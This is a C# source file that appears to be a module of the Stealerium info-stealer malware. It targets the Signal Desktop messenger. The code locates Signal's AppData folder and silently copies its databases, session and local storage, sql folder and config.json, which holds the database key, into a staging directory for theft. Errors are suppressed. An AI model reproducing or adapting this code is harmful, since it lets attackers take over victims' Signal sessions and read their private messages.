using System.IO;
using Stealerium.Helpers;

namespace Stealerium.Target.Messengers;

internal sealed class Signal
{
	private static readonly string SignalPath = Path.Combine(Paths.Appdata, "Signal");

	public static void GetSession(string sSavePath)
	{
		if (Directory.Exists(SignalPath))
		{
			string sourceFolder = Path.Combine(SignalPath, "databases");
			string sourceFolder2 = Path.Combine(SignalPath, "Session Storage");
			string sourceFolder3 = Path.Combine(SignalPath, "Local Storage");
			string sourceFolder4 = Path.Combine(SignalPath, "sql");
			try
			{
				Filemanager.CopyDirectory(sourceFolder, sSavePath + "\\databases");
				Filemanager.CopyDirectory(sourceFolder2, sSavePath + "\\Session Storage");
				Filemanager.CopyDirectory(sourceFolder3, sSavePath + "\\Local Storage");
				Filemanager.CopyDirectory(sourceFolder4, sSavePath + "\\sql");
				File.Copy(SignalPath + "\\config.json", sSavePath + "\\config.json");
			}
			catch
			{
				return;
			}
			Counter.Signal = true;
		}
	}
}
